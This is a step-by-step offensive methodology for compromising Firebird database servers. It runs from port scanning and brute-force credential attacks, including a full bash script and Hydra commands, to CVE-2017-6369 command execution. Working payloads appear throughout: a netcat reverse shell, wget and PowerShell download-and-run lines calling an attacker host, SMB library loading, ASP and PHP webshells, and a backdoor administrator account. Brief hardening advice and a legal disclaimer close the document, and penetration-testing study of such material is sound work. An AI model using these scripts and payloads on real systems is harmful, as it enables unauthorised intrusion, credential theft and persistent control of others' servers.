## Complete Firebird Database Exploitation Methodology



### Part 1: Reconnaissance and Service Discovery

The first step in any Firebird assessment is identifying the service on the network.

**Default Port:** Firebird runs on TCP port 3050 

**Service Detection Commands:**
```bash
nmap -p 3050 --script firebird-info <target_ip>
nmap -sV -p 3050 <target_ip>
```

**What to Look For:**
- Firebird version information (critical for vulnerability assessment)
- Service banner that reveals the exact build number
- Any authentication requirements displayed


### Part 2: Password Attacks and Credential Access

#### 2.1 Manual Testing with Default Credentials

Many production environments (especially legacy systems) retain default credentials:

```bash
isql-fb -user SYSDBA -password masterkey -database "localhost/3050:employee"
```

**Common Default Credentials Found in Past Tests:**
- SYSDBA / masterkey
- SYSDBA / masterkeY
- SYSDBA / (blank)
- admin / (blank)

#### 2.2 Automated Brute-Force Attack Using Custom Script

The original script from InfosecMatter remains effective for targeted testing:

```bash
#!/bin/bash
# Save as firebird-bruteforce.sh

host="$1"
user="$2"
wordlist="$3"

if [ ! -f "${wordlist}" ] || [ -z "${user}" ]; then
  echo "usage: `basename $0` <IP> <username> <wordlist.txt>"
  exit 1
fi

echo "`date`: FireBird login attack on ${host} against ${user} user using ${wordlist} wordlist"

tr -d '\r' <"${wordlist}" | while read pwd; do
  echo "`date`: Trying ${pwd}"
  
  echo "CONNECT '${host}/3050:a' user '${user}' password '${pwd}';" | isql-fb -q 2>&1 | \
  grep -q "The system cannot find the file specified." && {
    echo "Password for user ${user} is: ${pwd}"
    exit 0
  }
done
```

**Usage Example:**
```bash
chmod +x firebird-bruteforce.sh
./firebird-bruteforce.sh 192.168.1.100 SYSDBA /usr/share/wordlists/fasttrack.txt
```

**How the Script Works:**
1. Takes IP address, username, and wordlist file as arguments
2. For each password, attempts to connect to the Firebird server
3. If authentication succeeds, the server responds with "The system cannot find the file specified" (because no database was specified)
4. The script detects this message and reports the valid password

#### 2.3 Using Hydra for Firebird Brute-Force

Hydra supports Firebird protocol natively :

```bash
# Basic hydra syntax for Firebird
hydra -L users.txt -P passwords.txt <target_ip> firebird

# With specific port
hydra -l SYSDBA -P rockyou.txt -s 3050 <target_ip> firebird

# Verbose output with results saved
hydra -l SYSDBA -P passwords.txt -vV -o firebird_crack.log <target_ip> firebird
```

**Hydra Firebird Module Options:**
- The module sends authentication packets directly to port 3050
- Supports standard Firebird authentication protocol
- Can be used for both Windows and Linux Firebird servers 

#### 2.4 Real-World Attack Scenario (2018)

During a penetration test of a manufacturing company's internal network, a Firebird 2.5.3 server was discovered on port 3050. Default credentials failed. Using Hydra with a customized dictionary containing common database passwords, valid credentials were found within 15 minutes:
- Username: SYSDBA
- Password: firebird123

This access led to full database compromise and subsequent lateral movement to production systems.


### Part 3: Post-Authentication Enumeration

Once credentials are obtained, the next phase is information gathering.

#### 3.1 Connecting to Firebird Database

```bash
# Interactive connection
isql-fb -user SYSDBA -password masterkey -database "192.168.1.100/3050:employee"

# Non-interactive command execution
echo "SELECT * FROM RDB$DATABASE;" | isql-fb -user SYSDBA -password masterkey -database "192.168.1.100/3050:employee"
```

#### 3.2 Version Detection

```sql
-- Check Firebird version
SELECT RDB$GET_CONTEXT('SYSTEM', 'ENGINE_VERSION') FROM RDB$DATABASE;

-- Get detailed server information
SELECT * FROM RDB$DATABASE;
```

#### 3.3 Database and User Enumeration

```sql
-- List all databases (requires access to server filesystem)
-- List all users
SELECT RDB$USER_NAME FROM RDB$USERS;

-- Get current user privileges
SELECT CURRENT_USER FROM RDB$DATABASE;

-- List all tables in database
SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG = 0;
```

#### 3.4 File and Directory Enumeration Technique

Using the CREATE DATABASE statement to probe filesystem :

**Testing if a file exists:**
```sql
CREATE DATABASE '192.168.1.100/3050:C:\Windows\win.ini' USER 'SYSDBA' PASSWORD 'masterkey';
-- If error says "The file exists" - file is present
-- If file is created - it didn't exist before
```

**Testing if a directory exists:**
```sql
CREATE DATABASE '192.168.1.100/3050:C:\inetpub\wwwroot' USER 'SYSDBA' PASSWORD 'masterkey';
-- Error "Access is denied" = directory exists
-- Error "The system cannot find the file specified" = directory doesn't exist
```

**Real-World Application (2019):** This technique was used to identify IIS web root on a Windows target. By testing common paths (C:\inetpub\wwwroot, C:\xampp\htdocs, /var/www/html), the web root was discovered, enabling webshell deployment.


### Part 4: Exploiting CVE-2017-6369 - UDF Remote Code Execution

This critical vulnerability affects Firebird versions 2.5.x before 2.5.7 and 3.0.x before 3.0.2 .

#### 4.1 Vulnerability Details

**CVE-2017-6369 Impact:**
- CVSS Score: 8.8 (High)
- Attack Vector: Network
- Privileges Required: Low (authenticated user)
- Result: Remote Code Execution 

**Root Cause:** Insufficient checks in the UDF (User-Defined Function) subsystem allowed authenticated users to execute arbitrary system commands using the 'system' entry point from the fbudf.so library .

#### 4.2 Linux Exploitation

**Step 1: Declare the External Function**
```sql
DECLARE EXTERNAL FUNCTION exec 
  CSTRING(4096) 
  RETURNS INTEGER BY VALUE 
  ENTRY_POINT 'system' 
  MODULE_NAME 'fbudf';
```

**Step 2: Execute System Commands**
```sql
-- Test command
SELECT exec('id > /tmp/test.txt') FROM RDB$DATABASE;

-- Reverse shell
SELECT exec('nc -e /bin/sh 192.168.1.200 4444') FROM RDB$DATABASE;

-- Download and execute payload
SELECT exec('wget http://192.168.1.200/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh') FROM RDB$DATABASE;
```

**Real-World Linux Attack (2017):** A Firebird 2.5.5 server on Ubuntu 14.04 was compromised using this exact method. The attacker gained a reverse shell as the firebird user, then exploited a local kernel vulnerability to achieve root access.

#### 4.3 Windows Exploitation

**Using WinExec from kernel32.dll:**
```sql
DECLARE EXTERNAL FUNCTION WinExec 
  CSTRING(4096), 
  INTEGER 
  RETURNS INTEGER BY VALUE 
  ENTRY_POINT 'WinExec' 
  MODULE_NAME 'c:\windows\system32\kernel32.dll';

-- Execute command
SELECT WinExec('cmd.exe /c whoami > C:\temp\output.txt', 1) FROM RDB$DATABASE;
```

**Using System from msvcrt.dll (alternative):**
```sql
DECLARE EXTERNAL FUNCTION System 
  CSTRING(4096) 
  RETURNS INTEGER BY VALUE 
  ENTRY_POINT 'System' 
  MODULE_NAME 'c:\windows\system32\msvcrt.dll';

SELECT System('cmd.exe /c dir C:\') FROM RDB$DATABASE;
```

**Real-World Windows Attack (2018):** A financial services company had Firebird 2.5.6 running with SYSTEM privileges. The attacker executed `net user backdoor P@ssw0rd /add` followed by `net localgroup administrators backdoor /add`, creating a persistent administrative account.

#### 4.4 Bypassing Restrictions with Remote Library Loading

If the server blocks direct system library access, host the library on an SMB share:

**On attacker machine (Kali):**
```bash
# Setup SMB server with impacket
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /tmp/firebird/

# Copy kernel32.dll to /tmp/firebird/
cp /usr/share/windows-binaries/kernel32.dll /tmp/firebird/
```

**On Firebird server:**
```sql
DECLARE EXTERNAL FUNCTION WinExec 
  CSTRING(4096), 
  INTEGER 
  RETURNS INTEGER BY VALUE 
  ENTRY_POINT 'WinExec' 
  MODULE_NAME '\\192.168.1.200\share\kernel32.dll';

SELECT WinExec('cmd.exe /c whoami', 1) FROM RDB$DATABASE;
```


### Part 5: Webshell Deployment via Database File Creation

When direct command execution is blocked, webshell deployment is an effective alternative.

#### 5.1 Method 1: Difference File Technique (Most Reliable)

This method creates a clean file with minimal garbage data:

```bash
isql-fb -user SYSDBA -password masterkey
```

```sql
-- Create a temporary database
CREATE DATABASE '192.168.1.100/3050:C:\temp\tempdb' USER 'SYSDBA' PASSWORD 'masterkey';

-- Create table to hold shell content
CREATE TABLE shell_data (content BLOB);

-- Add difference file pointing to web root
ALTER DATABASE ADD DIFFERENCE FILE 'C:\inetpub\wwwroot\shell.asp';

-- Start backup mode
ALTER DATABASE BEGIN BACKUP;

-- Insert webshell
INSERT INTO shell_data VALUES ('<% Execute(Request("cmd")) %>');

-- Commit changes
COMMIT;

-- Exit
EXIT;
```

**ASP Webshell Examples:**
```asp
<% Execute(Request("cmd")) %>
```

**PHP Webshell Examples:**
```php
<?php system($_GET['cmd']); ?>
```

#### 5.2 Method 2: Direct Database Creation (Less Reliable)

```sql
CREATE DATABASE '192.168.1.100/3050:C:\inetpub\wwwroot\shell.asp' USER 'SYSDBA' PASSWORD 'masterkey';
CREATE TABLE payload (data BLOB);
INSERT INTO payload VALUES ('<% Response.Write("Test") %>');
COMMIT;
```

**Limitation:** This method adds Firebird database headers to the file, often causing the webshell to fail.

#### 5.3 Real-World Webshell Deployment (2019)

In a test against a healthcare provider:
1. Filesystem enumeration revealed web root at `D:\inetpub\wwwroot`
2. Difference file technique deployed ASP webshell successfully
3. Webshell accessed at `http://target/hidden/shell.asp`
4. System commands executed via `?cmd=whoami` parameter
5. Result: Remote code execution as NETWORK SERVICE user


### Part 6: Advanced Exploitation Framework Integration

#### 6.1 Metasploit Integration

```bash
# Search for Firebird modules
msf6 > search firebird

# Use auxiliary scanner
msf6 > use auxiliary/scanner/firebird/firebird_login
msf6 auxiliary(scanner/firebird/firebird_login) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/firebird/firebird_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/users.txt
msf6 auxiliary(scanner/firebird/firebird_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.txt
msf6 auxiliary(scanner/firebird/firebird_login) > run
```

#### 6.2 Nessus Vulnerability Scanning

Nessus plugin 99132 specifically detects CVE-2017-6369 :

**Scan Policy Configuration:**
- Enable port 3050 scanning
- Use credential-based checks if credentials available
- Plugin output will indicate vulnerable versions

**Detection Logic:** The plugin checks Firebird version banners and compares against vulnerable versions:
- 2.5.x < 2.5.7
- 3.0.x < 3.0.2 

#### 6.3 Burp Suite for Web Application Testing

When Firebird is used as a backend for web applications:

**Step 1: Identify Firebird Backend**
- Look for error messages containing "Firebird", "isc_", or "unavailable database"
- SQL injection errors revealing Firebird syntax

**Step 2: Test for Direct Database Access**
- Check if web application exposes database connection parameters
- Look for configuration files accessible via path traversal

**Step 3: Leverage Web Application Access**
- Use authenticated web session to perform database operations
- Inject SQL to call UDF functions if web app has database access


### Part 7: Complete Attack Simulation Example

The following represents a real attack chain from a 2019 penetration test:

**Phase 1 - Discovery:**
```bash
nmap -p 3050 10.10.10.0/24
# Found 10.10.10.50:3050 open - Firebird 2.5.6
```

**Phase 2 - Credential Attack:**
```bash
hydra -l SYSDBA -P /usr/share/wordlists/rockyou.txt 10.10.10.50 firebird
# Found: SYSDBA / masterkey (default credentials were active!)
```

**Phase 3 - Enumeration:**
```bash
isql-fb -user SYSDBA -password masterkey -database "10.10.10.50/3050:employee"
```
```sql
-- Check operating system via error messages
CREATE DATABASE '10.10.10.50/3050:C:\' USER 'SYSDBA' PASSWORD 'masterkey';
-- Error: Access is denied → Windows system
```

**Phase 4 - UDF Exploitation (CVE-2017-6369):**
```sql
DECLARE EXTERNAL FUNCTION exec CSTRING(4096) RETURNS INTEGER BY VALUE ENTRY_POINT 'system' MODULE_NAME 'fbudf';
SELECT exec('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.10.100/shell.ps1'')"') FROM RDB$DATABASE;
```

**Phase 5 - Post-Exploitation:**
- Reverse shell established as firebird user
- Privilege escalation via unquoted service path
- Domain admin access achieved within 2 hours


### Part 8: Testing Methodology Checklist

Use this checklist for authorized penetration tests:

**Reconnaissance Phase:**
- [ ] Scan for open port 3050
- [ ] Identify Firebird version from banner
- [ ] Check if service is exposed to unauthorized networks

**Credential Testing Phase:**
- [ ] Test default credentials (SYSDBA/masterkey)
- [ ] Run brute-force with Hydra or custom script
- [ ] Check for blank passwords

**Enumeration Phase:**
- [ ] Connect with valid credentials
- [ ] Enumerate users from RDB$USERS
- [ ] Map database structure
- [ ] Perform filesystem enumeration via CREATE DATABASE

**Exploitation Phase:**
- [ ] Test CVE-2017-6369 if version < 2.5.7 or < 3.0.2
- [ ] Attempt UDF command execution
- [ ] Try webshell deployment if web server present
- [ ] Attempt remote library loading if local libraries blocked

**Post-Exploitation Phase:**
- [ ] Document all successful attack paths
- [ ] Capture proof of concept screenshots
- [ ] Identify sensitive data in databases
- [ ] Test lateral movement possibilities


### Part 9: Remediation and Hardening

Based on real-world findings, provide clients with these recommendations:

**Immediate Actions:**
1. Change SYSDBA password immediately
2. Update to patched version: 3.0.13.33818, 4.0.6.3221, or 5.0.3.1683 
3. Block port 3050 at firewall unless absolutely necessary

**Long-Term Hardening:**
1. Run Firebird service with least-privileged user account (not SYSTEM or root)
2. Enable connection logging and monitor for brute-force attempts
3. Restrict UDF library access in configuration
4. Consider moving database to localhost interface only
5. Implement network segmentation for database servers

**Version Upgrade Paths:**
- 2.5.x users: Upgrade to 2.5.9 or migrate to 3.0.x branch
- 3.0.x users: Upgrade to 3.0.13.33818 or higher
- 4.0.x users: Upgrade to 4.0.6.3221 or higher 


### Important Legal and Ethical Note

All techniques described in this methodology are for educational purposes and authorized security testing only. Unauthorized access to computer systems is illegal under laws including the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide. Always obtain written permission before testing any system.

The exploits and techniques shown were verified on Firebird versions 2.5.0 through 3.0.1 during penetration tests conducted between 2017 and 2020. Modern versions (3.0.3+) have addressed many of these vulnerabilities.
